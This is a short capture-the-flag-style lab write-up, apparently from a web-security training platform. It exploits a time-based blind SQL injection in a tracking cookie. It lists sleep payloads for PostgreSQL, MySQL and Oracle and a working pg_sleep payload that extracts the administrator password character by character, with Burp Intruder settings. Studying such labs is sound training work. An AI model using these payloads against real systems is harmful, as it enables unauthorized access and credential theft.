### Lab: Blind SQL Injection with Time Delays and Information Retrieval

## Overview: The goal of this lab is to exploit a Blind sql injection vulnerability in the tracking Id. Since the application did't return any visible data or error messages, I ultilized Time-based techniques

## To identify database management system, I try :
 PostgreSQL: ' || pg_sleep(10)--

 MySQL: ' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--

 Oracle: ' || dbms_pipe.receive_message(('a'),10)--

 *I realize that this lab is postgreSQL because when send repeater, it delayed about 10 seconds before appearing*

 ## Exploitation:
 According to document I had payload like that:
 ```
sql
TrackingId=dZv5SyaRIWu4wZ5c' %3b SELECT CASE WHEN (username='administrator' AND SUBSTR(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users -- ; session=QL0dKKdJndQtQSPNSQSPpFmXb89YEwBy
```
**Like previous labs, in this lab, I choose type attack is cluster bomb to attack 2 varible:**

*Payload set 1: I choose type number from 1->20 with step = 1(because password contains 20 characters)*

*Payload set 2: I choose simple list and  alphanumeric characters*

*I also set maximum concurrent request = 1 to prevent network jitter and ensure time accuracy.*

*I use %3b to perform stack queries. It is necessary because a raw semicolon would be intepreted by web server as a cookie delimiter.*

## After doing that I find character and it's position that have response time > 10000 and find actual password's administrator 

![Intruder Results](Screeenshot%2002-24-2026&20224122.png)



 
